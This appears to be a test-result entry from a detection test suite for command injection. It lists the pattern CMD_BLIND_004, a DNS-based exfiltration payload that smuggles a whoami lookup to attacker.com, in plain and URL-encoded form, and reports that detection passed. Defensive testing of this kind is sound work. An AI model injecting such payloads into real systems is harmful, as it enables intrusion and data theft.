name: test_e2e_with_logs[166_CMD_BLIND_004]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_004` |
| **Name** | DNS-based data exfiltration |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; nslookup `whoami`.attacker.com`
- **Encoded**: `%3B%20nslookup%20%60whoami%60.attacker.com`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`

- **Latency**: ~22000ms
- **Timestamp**: 05:07:59.000 UTC
